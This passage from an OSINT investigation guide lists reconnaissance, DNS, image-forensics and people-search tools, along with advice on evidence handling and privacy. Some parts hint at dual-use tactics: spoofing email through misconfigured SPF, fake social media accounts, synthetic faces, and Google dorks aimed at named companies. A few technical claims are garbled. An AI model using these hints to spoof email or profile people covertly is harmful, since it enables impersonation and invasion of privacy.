Various tools are available to assist us in this endeavor, such as [https://archive.org](https://archive.org), where you can search the history of more than 570 billion web pages that either exist or have existed on the Internet. Theharvester (found in Kali Linux and other places: [https://tools.kali.org/information-gathering/theharvester](https://tools.kali.org)) is a tool that can gather information on individuals and organizations across the Internet. Other tools, such as Python and Go, can be used for those experienced in computer programming.

It’s important to remember that when you are performing an OSINT collection of data for an investigation, you must maintain proper Chain of Custody. What is Chain of Custody? According to NIST ([https://csrc.nist.gov/glossary/term/chain\_of\_custody](https://csrc.nist.gov)), it’s “a process that tracks the movement of evidence through its collection, safeguarding, and analysis lifecycle by documenting each person who handled the evidence, the date/time it was collected or transferred, and the purpose for the transfer.”

We are going to be requiring the use of cryptographic hash functions (CHF) so let’s go ahead and define it here: A cryptographic hash function is an algorithm that can be run on data such as an individual file or a password to produce a value called a checksum. The main use of a CHF is to verify the authenticity of a piece of data. In other words, a CHF can be used to ensure the integrity of a file or hard drive (i.e., no malicious tampering has taken place). Two files can be assumed to be identical only if the checksums generated from each file, using the same cryptographic hash function, are identical. Some commonly used cryptographic hash functions include MD5 and SHA-1, although many others also exist. Hash algorithms can be used for digital signatures and other security applications ([https://www.lifewire.com/cryptographic-hash-function-2625832](https://www.lifewire.com)). I don’t recommend SHA-1 ([https://csrc.nist.gov/glossary/term/SHA\_1](https://csrc.nist.gov)) or MD5 but NIST endorses SHA-3.

You will be gathering possibly sensitive data on people and businesses so remember that you are responsible for properly securing the said data. You should keep the data only for the time period for which you need it and subsequently destroy it. There are destruction facilities that you can take your data to, or you can use overwrite software, smash drives with a sledgehammer, or use magnetism (keep in mind that magnetism does not work well with SSD drives). Consider using encryption, virtual machines, and containers. Also make use of thumb drives, external hard drives and if possible, use a dedicated host for each investigation. Some organizations I’m familiar with wipe the hard drive after each investigation and then automatically lay a new image onto the hard drive. You can also just use a new hard drive for each new investigation and secure or destroy your prior hard drives. Raspberry Pi can also be used to significant advantage here since it can use removable Micro-SD cards. Consider using Full-Disk and File-Level encryption. Another safety feature is to always disconnect a system from the network (Internet or whatever) if you are not sitting at the machine and actively using it. Yes, this can be a hassle at times but it can also be a lifesaver for your investigations. The network you are using should be segmented off from the main network of the company you are working at.

When thinking of your own protection, one avenue is to push out disinformation about yourself. By doing so it confuses those who don’t know you but are looking for you. They won’t know what’s real and what’s not. It may not protect you permanently, but it can certainly slow down the bad guys. Another way to protect yourself from web scrapers is to put an emoji before your first name on the various sites you use, such as LinkedIn. To use an emoji on a Windows 10 machine just hold down the Windows key and press the period key. Place your cursor where you want the emoji to go, then just double click on the emoji you choose. If you can make yourself do it, don’t wear clothing that makes you stand out. If at some point someone wants to do a picture search for you, the wearing of t-shirts and hats (for example) that have logos or other items on them makes it easier to find you.

Let’s talk a bit about mathematics and in particular trigonometry. A knowledge of trig can take you a long way when looking at a picture and trying to determine its location, directions, etc. Shadows in the picture can provide both directional and time of day information.

Where can we collect OSINT? Let your imagination be your guide because there are many places such as public records, social media, search engines, data breach information, e-mail/phone number lookup sites, review sites, Yelp, Trip Advisor, and so forth … the beat goes on.

We mentioned some earlier, but what are some other tools we can use to collect OSINT? If you don’t mind paying some dollars, go for Hunchly ([https://www.hunch.ly/](https://www.hunch.ly)) and if you want a free tool try Zotero ([https://www.zotero.org/](https://www.zotero.org)). Techniques include screen recording (QuickTime for example), website downloads, screenshots, archives, API calls, Google Dorks, etc. Note that Hunchly automatically hashes all downloaded files. Note that Hunchly is a Canadian product. Google Earth Pro is also a great product for global sleuths. Other tools of use include VeraCrypt ([https://veracrypt.en.lo4d.com/windows),](https://veracrypt.en.lo4d.com) Maltego ([https://www.maltego.com/),](https://www.maltego.com) and Autopsy ([https://www.autopsy.com/)](https://www.autopsy.com).

Another excellent site is **OsintFramework.com**. Here is an excerpt from their website that shows how you can locate tools for various things you wish to accomplish:

![](images/inline15.1.jpg)

After you have collected various data, make copies and store them at three different locations away from each other. This will help to ensure your data is safe. When you have completed an investigation, your data should be moved to a secure offline storage, such as secured thumb drives and/or external hard drives. These should be clearly labeled with either a “date to destroy” or a “date to review for possible destruction.” Never keep any data you don’t need (but think ahead before you destroy it). I don’t recommend storing any of your data in a cloud unless you do it to avoid attribution. If you do use a cloud then be sure to establish very strict firewall rules, strong authentication and shut down your host when you are not using it.

Another tool you should have in your armory is ExifTool. Among other great things it does, it can tell you if a picture has been photoshopped. According to [https://linoxide.com/install-use-exiftool-linux-ubuntu-centos/:](https://linoxide.com)

“You may have come across ExifTool while searching for an image recovery software. Well, ExifTool does more than that. It’s an open-source program for reading, modifying, and manipulating images, videos, audios, and PDF metadata. Metadata are the additional data added to multimedia files. For example, the metadata of photographs are the additional data like the name of the device, the resolution of the image, the location the image was taken at, the date of capture and modification, and more. ExifTool supports several metadata formats including EXIF, GPS, XMP, GeoTIFF, Photoshop IRB, ID3, FlashPix. Your camera writes EXIF (Exchangeable image file format) and we’ll be focusing on images in this article, but note that ExifTool can be used to modify the metadata of any file. Also, if you need to quickly and safely copy, move, rename, extract previews, or modify multiple images at once, ExifTool is what you need.” Something else to keep in mind is that if you don’t have any Exif data then use reverse image searching. Also note that Exif can be used for other file types, not just images.

To use ExifTool:

*   Apt-get install exiftool
*   Exiftool <filename.jpg>

Note that Exiftool data can be modified and/or overwritten. There are various places you can pick up this tool (be sure to check the md5 hash to ensure you have the valid tool), such as [https://webintmaster.com](https://webintmaster.com). Other image-analysis and research tools to pick up here that you may find of interest are as follows:

1.  Tradint.IO 
    1.  a. Performs a full-scale Tradint (Trade Intelligence) investigation by making use of the finest tools and methods. Just insert a Company Name/URL/Sector/Location or any combination of them in order to obtain the tools you have need of, all arranged by context for your various research endeavors.
2.  TinEye (TinEye.com) 
    1.  a. Reverse image search and more
3.  FotoForensics (FotoForensics.com) 
    1.  a. Submit a JPEG or PNG for forensic analysis
4.  Face ([https://azure.microsoft.com/en-au/services/cognitive-services/face/](https://azure.microsoft.com)) 
    1.  a. Analyzes faces in images
5.  Market Researcher & Cyber Researcher
6.  Exif Viewer Pro 
    1.  a. [https://chrome.google.com/webstore/detail/exif-viewer-pro/mmbhfeiddhndihdjeganjggkmjapkffm?hl=en](https://chrome.google.com)
7.  Others ([https://webintmaster.com/webint-tools/](https://webintmaster.com))

Data retention requirements depend on where you work or whom you are doing some work for. Be sure you know the legal aspects of data retention that pertain to the case you are working.

When it comes to which web browsers to use for OSINT, I’d recommend TOR, Brave, or Firefox. I would also recommend that you use different browsers as you progress in your casework as this helps to protect you from others trying to learn what you are up to, even if you are an agent working a case. Another good practice is to continuously wipe your browsing history and cookies, etc. Note that one of the first things you should look at is the robots.txt file. Vary your use of search engines also, spreading your searches across ten or more different engines, remembering that in-country sites usually provide you with more information that is relative to your case. For example, if you are trying to find information on someone in France, VPN to Paris and run Google, MetaGer.org, and other search engines from there. This will enhance your productivity and the efficiency of your results. If you prefer an alternative map package to Google Maps try some other geographical viewers such as OpenStreetMap.org, WikiMapia.org, and even Bing.com and Yahoo.com (keep in mind that some of these have options that others do not have, so play around). Note that it can be interesting to VPN yourself to a certain location and then bring up the default map, such as in WikiMapia, so that you see a default map of the area you have VPN’ed to. And of course, you can use the Russian search engine (excellent for people) Yandex.ru. If you do use Yandex.ru then I recommend that you first VPN into some European country and then use the search engine from there.

Other sites that are of interest include:

*   WhatsMyName.app
*   TraffickCam.com
*   [https://tools.kali.org/information-gathering/recon-ng](https://tools.kali.org) 
    *   For conducting reconnaissance
    *   Written in Python
*   [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com)

Web scraping is certainly a method to gather information on a website but keep in mind that doing so is not legal in all countries, so if you are going to court with the data you collect, don’t perform an illegal operation and then show the evidence in court.

Social media intelligence gathering is known as SOCMINT. If you are with the government, you can easily set up fake social media accounts for your endeavors. You can also do this without being in the government but at some points it can be riskier for you (legally or otherwise, depending). Remember to always watch for patterns in your work, no matter which type of Intel you are gathering. The key social media accounts to look into during an investigation are:

*   Facebook (you see more 50+ age group hanging out here but there are others of course)
*   Twitter
*   Snap Chat
*   TikTok
*   Instagram (the younger crowd likes to operate here)
*   LinkedIn (Business professionals hang out here)
*   Pinterest (more women here)

Some excellent tools to use for managing, editing, and taking notes

*   CherryTree 
    *   [https://www.giuspen.com/cherrytree/](https://www.giuspen.com)
    *   [https://cherrytree-for-windows.en.lo4d.com/windows](https://cherrytree-for-windows.en.lo4d.com)
*   Notepad++ 
    *   [https://notepad-plus-plus.org/](https://notepad-plus-plus.org)
    *   Can run in Microsoft Windows

A tool quite useful for data analysis work is Kaggle:

*   [https://www.kaggle.com/](https://www.kaggle.com)
*   Contains over 50,000 public datasets and 400,000 public notebooks

If you are interested in using information from Snap Chat, you can use the following site to watch snaps from Snapchatters globally:

*   [https://map.snapchat.com/](https://map.snapchat.com)

For Twitter try:

*   [https://www.trendsMap.com/map](https://www.trendsmap.com) 
    *   There is also a pro version
*   [https://oneMillionTweetMap.com](https://onemilliontweetmap.com)

Use [https://viewDNS.com](https://viewdns.com) and [https://ns.tools/](https://ns.tools) if you would like to research any of the following:

*   DNS Lookup (various records such as: A, NS, MX, TXT, CNAME, and more)
*   Reverse IP Lookup
*   IP Geolocation
*   Traceroute 
    *   Note that this is essentially a series of pings as you move along the network path
*   Ping IP
*   Check if a website is up or down
*   Whois Lookup
*   Also try [https://dnsdumpster.com/](https://dnsdumpster.com) and [https://mxtoolbox.com/](https://mxtoolbox.com) and [https://securitytrails.com/](https://securitytrails.com) 
    *   SecurityTrails advertise themselves as “Powerful tools for third-party risk, attack surface management, and total intel”
*   inurl:ftp -inurl:(http|https) intext:”advocavySolutionsllc.com”

When it comes to DNS popularity, Cloudflare appears to be number one. They advertise themselves as: “Cloudflare DNS is an enterprise-grade authoritative DNS service that offers the fastest response time, unparalleled redundancy, and advanced security with built-in DDoS mitigation and DNSSEC.”

*   [https://www.cloudflare.com/dns/](https://www.cloudflare.com)
*   BlueHost.com
*   SiteGround.com
*   OpenDNS.com
*   [https://discordservers.com/browse/OSINT](https://discordservers.com) 
    *   Public OSINT Discord Servers
    *   There is a “Discord for Dummies” book if you don’t know what this is. In short, here is a short excerpt from Dummies.com informing us as to just what a discord server is: 
        *   – “Perhaps the trickiest thing to do right off the bat is define Discord. On the surface, it looks and sounds like Skype on steroids, but it’s a robust, stable communications platform available as a browser application, a stand-alone desktop application, and a mobile app for both smartphones and tablets.” Discord offers the following features: 
            *   – Text chat
            *   – Audio and video chat (group and private)
            *   – Private text messaging
            *   – News feeds
            *   – Link and media sharing
            *   – Streaming and screen sharing
        *   – Discord provides gamers, streamers, and many other creative individuals and organizations an all-encompassing platform for topic-specific chat streams, private audio channels and open public chats, interviews for podcasts and streams, and much more …
        *   – Oh, and Discord costs now what it did when it was introduced: free.
        *   – Discord stands apart from other game comms solutions – and for many professionals reliant on using the Internet for communications – for its stability, audio quality, video quality, and ease of use. It may seem a little intimidating when you first launch it, but setup and use are incredibly easy.”

Discover innovative companies and the people behind them

*   CrunchBase.com
*   DNB.com
*   Bloomberg.com

Quad9 announces re-incorporation in Switzerland to guarantee privacy for global DNS users.

*   Quad9.com

Another thing to remember is that you can learn a lot about a company’s culture, what technology they are using, and so on through sites like glassdoor.com, USAjobs.com, IntelligenceCareers.gov, Indeed.com, LinkedIn.com, Monster.com, CareerBuilder.com, Dice.com, and so on. Also do a search on “Public Filings” for all sorts of public information.

If you come across what seem to be unusual files and you want to have them analyzed for malicious content, make use of:

*   [https://www.virusTotal.com](https://www.virustotal.com)

How would we go about performing an external risk assessment of an organization that is of interest to us?

*   Take a look at their DNS posture using the tools mentioned above for DNS 
    *   Be sure to do the same for their vendors that are in their supply chain

Among others, an application to be wary of that is taken advantage of by malicious actors is TeamViewer. This is desktop sharing and communications software and can be observed (and downloaded) from [https://www.teamviewer.com/en-us/download/windows/](https://www.teamviewer.com). Malicious actors can just drop files you don’t want onto your computer system when you use this software. If you do use it, like other similar programs, be sure you secure your network and system properly prior to engaging.

CyWatch is the FBI’s 24/7 operations center and watch floor, providing 24/7 support to track incidents and communicate with field offices across the United States:

*   [https://www.fbi.gov/investigate/cyber](https://www.fbi.gov)
*   855-292-3937 or CyWatch@FBI.gov
*   SAR = Suspicious Activity Report

For Microsoft Windows 7, keep in mind that even though it has reached what Microsoft terms “End of Life,” you can still obtain an ESU (Extended Security Updates) and technical support if you are willing to pay the monies. This applies to Windows 7 Professional and Enterprise and payment is on a per device standard. Even this support disappears effective January 2023.

Key government organizations from an intelligence community perspective:

*   Five Eyes (5-Eyes) 
    *   The Five Eyes (FVEY) is an intelligence coalition that consists of (in alphabetical order) Australia, Canada, New Zealand, the United Kingdom, and the United States. FVEY is party to the joint UKUSA Agreement which is a treaty for multilateral teamwork in the signals intelligence arena.
*   Nine Eyes (9-Eyes) 
    *   In this organization within the global intelligence community, we have the countries in FVEY plus an additional four – Denmark, France, the Netherlands, and Norway.
*   Fourteen Eyes (14-Eyes) 
    *   This is a consortium of the players in Nine Eyes plus five more countries – Belgium, Germany, Italy, Spain, and Sweden.
*   Other countries that cooperate in the intelligence community and work in conjunction with Fourteen Eyes for various items include British Overseas Territories, Israel, Japan, Singapore (not as much as they once did), and South Korea (again, less than they used to due to the increased discussions between North and South Korea)
*   There are other “similar” groupings but such information is not publicly disseminated

Let’s use PIA to mean Private Internet Access. From a VPN perspective for OSINT work, NordVPN (based in Panama) is not recommended but ProtonVPN (based in Switzerland with very strict data privacy laws) is one recommendation. Note that as stated earlier, the use of VPN’s gives you the advantage of regionalized search results. All the better for your OSINT investigations is the use of a VPN (hides who) in conjunction with either Tor Browser (hides what) or the Brave Browser. You should have access to more than one VPN in case your original one stops working for some reason. It’s always good to have a backup. Another reason for using more than one VPN is that some get into regions and sites that some others do not. For all of your security tools, if you can afford it, you are almost always better off using the products you have to pay for since many times there is a reason the other product is “free,” and this “free” may be something you end up being sorry you used due to something unknown to you going on in the background, so be careful and alert. Excellent search engines to make use of include MetaGer.org, DuckDuckGo.com, Bing.com and Google.com (and of course there were others mentioned earlier). If you want to learn more about penetrating networks a good site to learn from is [https://www.offensive-security.com/](https://www.offensive-security.com) where you can earn certifications in this skillset valued by employers.

Some examples of using Google Dorks:

*   In the search engine box for Google or DuckDuckGo you type 
    *   Related: Alstom.com 
        *   – From this you will see other sites/pages of potential interest
    *   Site: lifewire.com filetype: html 
        *   – See html files on lifewire.com
    *   Inurl:php -Boeing.com 
        *   – See php files on Boeing.com
    *   Intext: “<wallet address>”
    *   Just play around with these and other Google Dorks to become familiar with them

Eliminating advertisements that you don’t wish to have interfering with your work can be done using pi-hole ([https://pi-hole.net/](https://pi-hole.net)). Pi-hole is essentially a network-wide advertisement blocker. As an alternative to installing adblockers on every device/browser on your network, you can instead install Pi-hole just once on the network, and it will subsequently protect all of your browsers/devices. Essentially, Pi-hole is functioning as an internal, private DNS server on a network. Pi-hole intercepts any and all queries for recognized advertisement-serving Internet domains and denies them access, preventing the advertisements from being downloaded.

If you want to find out what information search engines have on you, and have a way to remove it, try using [https://onerep.com/](https://onerep.com). They seem to have a successful methodology in place. I repeat though that the best way to prevent others who don’t know you from collecting information about you is to use what was taught to us in the military and intelligence communities…push out misinformation about yourself, then those who don’t know you won’t really know what’s right and what’s wrong. Many of us who have worked in intelligence communities globally have been doing that for over 20 years based on the instruction we received. What you want to do now is to either eliminate or at least significantly minimize your digital exhaust. What is digital exhaust you ask? Just as automobile engine exhaust is residue coming out of a car’s exhaust pipes in the rear, digital exhaust is data/digital residue from your use of the Internet. The FBI has released a document entitled “Digital Exhaust Opt Out Guide” that you should read and follow.

Along this same line of thought, don’t think that records that have come from systems prior to 1985 (and perhaps a little further into the future … not sure) are accurate for military and government records. In 1974, in both the military and Intelligence Community (IC) it was common to use “burn bags” to dispose of classified information. These burn bags resided at everyone’s desk who dealt with classified information. A cart would come around at designated times to collect the bags and bring them to the oven in the basement where the flaming fire would permanently dispose of the classified information. The 1974 timeframe was also the beginning of a transitional time, a time when information that had always been on paper was being transferred on to computers. There were no scanners in existence at that time so all the information that had to be transferred on to the computers had to be typed in, one document at a time by each individual assigned to the task. When this task began, most at that time didn’t realize just how important computerized information would become. As time moved forward, more and more documents were being typed in to computers based on schedules set by government/military authorities. The schedules were getting more and more difficult to meet in conjunction with the fact that the personnel typing in thousands and thousands of documents were getting bored doing all that typing. Officers and senior enlisted personnel had no interest in doing all that typing nor did they consider it all that important. Typing assignments were given to lower grade personnel but as it turned out, some began to see a profitable venture that most others missed. At first it was favors paid for by cigarettes and as time went by the ante was raised for other items, including dollars. Enlisted personnel would go to those typing in the records, asking them to change their enlistment dates, tours of duty, campaign badges they won, battlefield promotions leading to rank increases, and numerous other items. Bottomline here is that some personnel in the military who fought during the Vietnam War received changes to their records that some thought were going to be meaningless in exchange for very small favors. Although I don’t have personal knowledge of others, most likely this occurred globally at this time both in the military/government and commercial arenas. An interesting time indeed. Human nature is human nature.

Regular Expressions is another avenue to be used for data extractions. These types of operations can be performed using Linux, Python, and other tools. This is a course in itself and if you wish to know more feel free to google the term and learn from various websites.

Earlier we talked about DNS and various tools with regard to it. A key item to remember is that when you use one of the tools called “Dig” to pull MX records, the lower number next to a device means that it has the higher priority to receive e-mail. A vulnerability that can be taken advantage of in this regard is the SPF records because many get misconfigured relative to e-mail security due to misunderstandings by System Administrators. Even today you can directly access e-mail servers globally and send emails either anonymously and without attribution to yourself without the use of any e-mail utility (Outlook, yahoo Mail, etc.) just by using the command line in Linux. “Dig” is another popular tool that can be utilized either at the command line or via one of the utilities mentioned earlier. As mentioned earlier, [https://mxtoolbox.com](https://mxtoolbox.com) is an excellent site for various DNS and e-mail related information. Cisco has a service they offer called IronPort focused on mitigating e-mail and other web-related threats ([https://www.ironportstore.com/Technology.asp](https://www.ironportstore.com)). Becoming familiar with “A” records can allow you to send emails on behalf of other domains.

GlobalSign (globalsign.com) issues https certificates and performs many other identity related services globally. Let’s Encrypt (letsencrypt.org) is a non-profit certificate authority run by Internet Security Research Group that provides X.509 certificates for Transport Layer Security encryption at no charge. It is the world’s largest certificate authority, used by more than 265 million websites, with the goal of all websites being secure and using HTTPS. Amazon AWS S3 buckets in their cloud offering are used for storage but have been compromised multiple times. Mailgun (mailgun.com) is used to enhance e-mail campaigns.

One way to tell if it’s a fake picture is to look at the eyes of the individuals in the picture. If the XY coordinates of the eyes are exactly the same in all pictures, then the picture is fake. Look at a site from different locations via a VPN to see if you come up with some surprises. OnionScan (onionscan.org) is a tool (open source and free) that can be used to investigate the Dark Web. It can be used to enhance privacy, detect misconfigurations, and monitor/track Dark Web sites. When you are using the Tenable Nessus Vulnerability Scanner, be sure to look at the red high scores in the NIST database. Nmap is another excellent tool for learning about networks and for performing threat hunting. Hunter ([https://hunter.io/](https://hunter.io)) is another weapon in your toolkit for quickly discovering e-mail addresses from numerous domains. Rocketreach (RocketReach.co) discovers e-mail, telephone, and social media links for over 450 million individuals. There is also a Chrome extension for it. They also have an API key programmers can make use of.

Recon-ng is a Web reconnaissance framework written in the Python programming language and can gather information on sub-domains, IP, Geolocation, Images, Vulnerabilities, etc. It comes pre-installed with the latest version of Kali Linux. Maltego is software (free and paid versions) useful for investigations, finding data from open sources, and subsequently visualizing that information in a graphical format. The FBI has what they can the Internet Crime Complaint Center ([https://www.ic3.gov/](https://www.ic3.gov)) and it has an easy format to file a complaint with the IC3 if you think (or know) that you have been the victim of a crime committed on the Internet. They also keep you abreast of various consumer and industry alerts. On the FBI InfraGard portal there is a malware investigator tool.

[https://www.ctwatch.us/](https://www.ctwatch.us) – From their website: “Counter-Terrorism Watch, Incorporated is a registered US Defense Contractor, professional security consulting, and training organization. The core of our directors and instructors stem from highly specialized units from within Federal Law Enforcement, State Law Enforcement, Intelligence Community (IC), and the US Special Operations Community. Our instructors are equipped with many years of real-world Counterterrorism experience. We are dedicated to providing the highest quality Counterterrorism Subject Matter Expertise (SME) to meet today’s global security needs.” Keep them in mind for both corporate and government training and operational needs.

Trigonometry and statistics can be important in an investigation, such as with shadow information in pictures. Let’s say you are doing an investigation and need to know what the weather (or other Earth-related events) was at a particular date and location. Several places to find out this information are:

*   [https://www.accuweather.com/](https://www.accuweather.com)
*   [https://www.wunderground.com/](https://www.wunderground.com)
*   [https://www.usgs.gov/science-explorer-results?es=NOAA](https://www.usgs.gov)
*   [https://www.google.com/earth/versions/](https://www.google.com)
*   [https://www.google.com/maps/](https://www.google.com)

If you need assistance with sun/shadow calculations you can obtain help here:

*   [https://www.suncalc.org](https://www.suncalc.org)
*   [http://suncalc.net](http://suncalc.net)

I would recommend against using the mobile apps for LinkedIn … they are just too invasive. With a focus on photographs, audio, and video analysis, here are some tools you should look into (I use these in a Linux environment):

*   ****GIMP**** – powerful image and photo editing software [https://d.tube/#](https://d.tube)!/v/anontechtube00/7hf7m0vrfr3
*   **Flameshot** – really powerful screenshot and image capture tool
*   **Shotwell** – for organizing image collections
*   **Audacity** – powerful audio editor
*   **SoundConverter** – convert audio files to different types
*   **Darktable** – managed and edit RAW images. Allows you to edit geotags
*   **Photoflare** – simple image editor
*   **SimpleScreenRecorder** – Numerous useful features. Allows you to record all or a portion of your screen. Can be used for documenting your work for evidentiary purposes, or capturing videos that are difficult to download, such as SnapMap videos or live streamed content.
*   **Peek** – Basic screen recording tool
*   **Vimeo.com** – Produce, manage, and share high-quality videos.
*   [https://keepv.id/29/](https://keepv.id) – Download online videos
*   [https://ymp4.download/en39/](https://ymp4.download) – Download YouTube videos
*   **OCR (Optical Character Recognition) Tools of Interest:**
*   [http://ocr.space](http://ocr.space) – Converts scans or images (like from a smartphone) of text documents into editable files. Can also obtain text from a PDF.
*   [https://www.onlineocr.net/](https://www.onlineocr.net) – This is a free online OCR service that makes use of Optical Character Recognition software online. Supports 46 languages; You can convert a scanned PDF to Microsoft Word and subsequently extract text from the PDF and images (JPG, BMP, TIFF, GIF);
*   [https://www.newocr.com/](https://www.newocr.com) – Another free online OCR service that can analyze the text in image files that you upload, and subsequently converting the text from the image into text that you can edit;
*   [https://convertio.co/ocr/](https://convertio.co) – Converts scanned documents and Images into editable Microsoft Word / Excel, PDF, and text output formats
*   So, in reference to the above items, when you take a screenshot and it contains text of interest, push the screenshot through an OCR tool and then the text becomes searchable.

**Linguistic Translation Tools of Interest (you never know what languages are going to pop up during your investigations):**

*   [https://translate.google.com/](https://translate.google.com)
*   [https://www.linguee.com/](https://www.linguee.com)
*   [https://www.deepl.com/translator](https://www.deepl.com)

And here are some other miscellaneous tools I use under Linux that I find useful:

*   **Amass** – network scanning tool that finds sub-domains, related IP blocks, and maps out the results.
*   **Transmission** – peer-to-peer filesharing application
*   **Telegram Client** – not really vital for an OSINT build, nonetheless it’s a very popular communication platform. If you plan to provide a hashed copy of your virtual machine for use as evidence then it’s prudent to retain all of your communications separately on your own host machine unless they end up being essential to the case.
*   **Organize My Files** – Helps to keep your work well organized and it comes with a GUI
*   **PDFsam** – Split and sort PDF files
*   **Bleachbit** – Secure anti-forensic deletion of files
*   **Kate** – An easy to use but powerful text editor
*   **KeepassX** – A password manager that stores passwords locally instead of somewhere else like LastPass. Uses either AES or Twofish encryption.
*   **Yubico Authenticator & QRentry** – Permits you to create one-time passwords on your computer for accounts where you make use of two-factor authentication

During the course of your investigation, an international flair of some type may come forth, which is not unusual in this day and age. That being the case, it could well be that regional searches will serve you better. For example, let’s say your focus area is Australia but you are in the United States, what should you do? You want to use URL’s that are regional specific, for example:

*   [https://www.google.com.au](https://www.google.com.au) 
    *   Now your Google search will focus on Australia (even better when you VPN to Australia first)

*   [https://chrome.google.com/webstore/detail/history-master/mkfgjjeggnmkbobjmelbjhdchcoadnin](https://chrome.google.com)

*   Grab the History Master plugin for Chrome to visualize browsing behaviors and determine formerly unknown behaviors

*   [https://accessdata.com/product-download/ftk-imager-version-4-5](https://accessdata.com) – AccessData FTK Imager is a forensics tool whose primary purpose is to preview recoverable data from a disk (computer hard drive, USB stick, etc.) of any type. It also creates flawless copies (forensic images) of said data. Currently it is a free product from AccessData.
*   [https://www.volatilityfoundation.org/26](https://www.volatilityfoundation.org) – Volatility is popular for carrying out memory forensics
*   [https://sleuthkit.org/autopsy/](https://sleuthkit.org) – Autopsy® is a digital forensics platform and GUI to The Sleuth Kit® and various other forensics tools. It is put to use by law enforcement, military, and corporate forensics examiners to investigate what occurred on a computer. One could also make use of it to recover photographs from a camera’s memory card.

QuickTime can be used to record the screen of a MAC computer.

**URL’s for finding information about people, domains, and companies**

*   [https://www.lexisnexis.com/en-us/products/lexis-plus.page](https://www.lexisnexis.com)
*   [https://www.peoplelooker.com/](https://www.peoplelooker.com)
*   [https://www.spokeo.com/](https://www.spokeo.com)
*   [https://pipl.com/](https://pipl.com)
*   [https://haveibeenpwned.com/](https://haveibeenpwned.com)

Remember to never perform an OSINT investigation using a personal account on a website. Always use a separate account you only use for investigations. For all your websites, use passwords that have at least 12 characters, and be sure it is a strong password. Note that the Raspberry Pi system is totally sufficient for many investigations.

*   [https://viatravelers.com/best-travel-routers/](https://viatravelers.com) – When you are on travel it’s nice to be able to stand up your own wireless network. Read this site and make your choice. I spend around $70 for mine. These can include an IDS (Intrusion Detection System) also.
*   [https://grasshopper.com/competitors/googlevoice/](https://grasshopper.com) – I’ve not had much success using Google Voice and prefer Grasshopper when it comes to virtual phone communications plans (use when you don’t want your investigation tied to your personal phone numbers, which should be always).

During investigations and travel, you can pick up burner phones with a new sim card at airports, etc. If you need a picture of a person for some reason during an investigation (you will have to give this some thought), one site to look at is:

*   [https://thisPersonDoesNotExist.com/](https://thispersondoesnotexist.com)

When it comes to extra reading on privacy…an excellent author is:

*   Michael Bazzell – “Extreme Privacy”

Annual Reports ([https://www.annualreports.com/](https://www.annualreports.com))

*   Corporate annual report information

Bloomberg ([https://www.bloomberg.com/](https://www.bloomberg.com))

*   Corporate financial information

Brave ([https://brave.com/](https://brave.com))

*   Privacy shield for your work; Blocks ads from grabbing your data and tracking you; Browse even more privately with Tor; Brave allows you to use Tor right in one of its tabs. Tor hides your history and it masks your location from the websites you are visiting by routing you through a number of servers prior to reaching your destination. These connections are also encrypted to increase anonymity. Browse without fear of censorship from outside influences using IPFS which is integrated into Brave’s desktop browser;

Crunchbase ([https://www.crunchbase.com/](https://www.crunchbase.com))

*   Discover information pertaining to people and companies

Dig ([https://toolbox.googleapps.com/apps/dig/](https://toolbox.googleapps.com))

*   Dig can be used at the command line or as a GUI to obtain DNS information

DNS Checker ([https://dnschecker.org/all-dns-records-of-domain.php](https://dnschecker.org))

*   Numerous DNS checking tools

DNS Dumpster ([https://dnsdumpster.com/](https://dnsdumpster.com))

*   Research tool that can discover hosts related to a domain. DNSDumpster gathers information passively and is a useful tool for DNS reconnaissance, perform MX, TXT records, NS Lookup, sub-domain enumeration, etc.

Dun & Bradstreet ([https://www.dnb.com/](https://www.dnb.com))

*   Private & public company information

EDGAR ([https://www.sec.gov/edgar/searchedgar/companysearch.html](https://www.sec.gov))

*   Company SEC filings

Google Dorks ([https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com))

*   Google Hacking Database (GHDB)

Google Earth ([https://earth.google.com/](https://earth.google.com))

*   Use for mapping out locations and learning more about them

Google Maps ([https://www.google.com/maps](https://www.google.com))

*   Map out locations, obtain directions, see local information

Hashtagify ([https://hashtagify.me/](https://hashtagify.me))

*   Search real-time data and obtain insights into any hashtag on Twitter such as popularity ranking, related hashtags, trends, and numerous other items; Obtain in-depth hashtag analysis. Divulge trending hashtags, screen pertinent content and discover influencers you would want to know about. Obtain the data you want in easy-to-read dashboards and charts. Audit your performance, monitor aggregated analytics and then move forward to build customized reports.

Host

*   Some more DNS snooping at the command line

Hunchly ([https://hunch.ly/](https://hunch.ly))

*   From the Hunchly website: “The Web Capture Tool Designed for Online Investigations; Never forget to screenshot again; Hunchly automatically collects, documents, and annotates every web page you visit; Hunchly is the only tool that automatically creates a transparent audit trail for your online investigations; Build investigation reports quickly and easily; Drag and Drop Reporting; Hunchly automatically tracks the URL, timestamps, and hashes every page you visit during an investigation. This saves you hours in documentation time so you have more time for performing investigative work; Hunchly includes tools for you to quickly build disclosure packages for court. Compile the evidence you need to disclose, and know that all of the forensic history is included. Hunchly’s evidence signing allows a 3rd party to easily validate the evidence that you have submitted. Easily categorize content while you build your next story. Never lose a social media post or interesting investigative nugget again. Identify connections between webpages; A powerful full text search capability enables you to easily hunt through your stored data. Keep the core subjects of your story organized with page tagging so that you can easily backtrack through your research when it comes time to put pen to paper. Keep track of all your steps when researching threat actors. Easily bring Hunchly data into your other research tools. Researching threat groups can lead you down many rabbit holes. Easily track where you have been, and what you have seen. Automatically preserve forum posts, social media, and dark web research without having to think about it; The Hunchly API allows you to pull data into other tools such as Maltego, Spiderfoot, Recon NG and others.”

IDA Pro ([https://hex-rays.com/IDA-pro/](https://hex-rays.com))

*   Disassembler and Debugger; Binary code analysis and reverse engineering usage;

Instagram ([https://www.instagram.com/](https://www.instagram.com))

*   Allows you to search for people posting at a particular address (geofencing)

Jeffrey’s Image Metadata Viewer ([http://exif.regex.info/exif.cgi](http://exif.regex.info))

*   Image Metadata Viewer – copy a photo URL or upload from your computer

Kali Linux ([https://www.kali.org/](https://www.kali.org))

*   Linux Penetration Testing Distribution; Kali Linux is an open-source, Debian-based Linux distribution that focuses on cybersecurity tasks, such as reverse engineering, penetration testing, security research, and computer forensics.

Maltego ([https://www.maltego.com/](https://www.maltego.com))

*   Graphical link analysis tool; Accelerates investigations and analysis;

Metagoofil ([https://tools.kali.org/information-gathering/metagoofil](https://tools.kali.org))

*   An information gathering tool designed to extract metadata from public documents

MXToolbox ([https://mxtoolbox.com/SuperTool.aspx](https://mxtoolbox.com))

